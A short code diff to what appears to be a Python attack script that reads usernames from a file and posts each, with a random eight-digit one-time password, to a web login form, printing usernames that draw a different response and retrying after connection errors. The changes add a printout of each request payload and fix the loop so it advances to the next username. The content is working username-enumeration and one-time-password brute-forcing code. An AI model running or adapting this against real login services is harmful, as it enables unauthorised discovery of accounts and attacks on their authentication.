@@ -4,6 +4,7 @@
 import random
 import requests
 import time
+import json
 
 debug = False
 
@@ -28,6 +29,7 @@ while usrname != '':
     postparam["inputUsername"] = usrname
     postparam["inputOTP"] = str(random.randint(10000000, 99999999))
     sess = requests.session()
+    print("- [+] Payload: " + json.dumps(postparam))
     try:
         sess.get('http://' + host + '/')
         r = sess.post(finaluri, data=postparam)
@@ -35,7 +37,7 @@ while usrname != '':
             pass
         else:
             print(postparam["inputUsername"])
-            usrname = f.readline().strip()
+        usrname = f.readline().strip()
     except requests.exceptions.ConnectionError as ce:
         time.sleep(300)
         continue
